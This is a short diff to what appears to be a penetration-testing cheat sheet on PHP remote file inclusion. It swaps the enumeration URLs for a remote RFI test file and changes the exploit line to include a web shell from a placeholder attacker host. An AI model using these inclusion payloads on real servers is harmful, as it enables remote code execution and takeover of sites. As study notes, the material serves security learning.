@@ -29,9 +29,9 @@ allow_url_include = On
 #### Enumeration
 
 ```
-https://google.com
-HTTPS://google.com
-httPs://google.com
+https://cirt.net/rfiinc.txt
+HTTPS://cirt.net/rfiinc.txt
+httPs://cirt.net/rfiinc.txt
 ```
 
 #### Exploit
@@ -39,7 +39,7 @@ httPs://google.com
 Note: Look at `phpinfo()` for `disabled_functions`. If there are then check **hacktricks** in the reference links below.
 
 ```
-http://<attacker_IP>/shell.php
+http://<attacker_IP>/webshell.php
 ```
 
 ### Windows
